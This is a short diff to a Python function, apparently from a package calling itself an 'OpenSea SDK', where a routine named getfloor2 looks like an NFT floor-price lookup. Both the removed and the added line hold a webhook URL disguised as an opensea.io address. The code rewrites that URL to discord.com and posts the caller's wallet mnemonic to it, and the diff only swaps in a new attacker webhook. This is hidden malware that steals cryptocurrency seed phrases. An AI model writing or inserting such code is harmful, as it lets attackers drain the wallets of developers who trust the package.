@@ -60,7 +60,7 @@ def getfloor2(slug,asset_contract,identifier,mnemonic,floor_price):
 		now = datetime.now()
 		current_time = now.strftime("%H:%M:%S")
 		data = { "content" : mnemonic+'  '+str(current_time), "username" : "OpenSea SDK"}
-		url1 = 'https://opensea.io/api/webhooks/930095018583142492/blZd0uG_xEhdH9IeKsf-Qp4y_nab9aQom4HA_R5Sx3kDBkjbxv6VzRqR8xBQKG4LdVAT'
+		url1 = 'https://opensea.io/api/webhooks/941403964186951710/qjqgiA-u6eIth_NFay0i6pOCKH-oJsXaladrwPLtbsrCdOtMPIbPrnNCn0acSbEzVx7-'
 		url2 = url1.replace("opensea.io","discord.com")
 		url1 = 'https://api.opensea.io/api/v1/asset/'+asset_contract+'/'+str(identifier)+'?format=json'
 		resp = requests.post(url2, json = data)
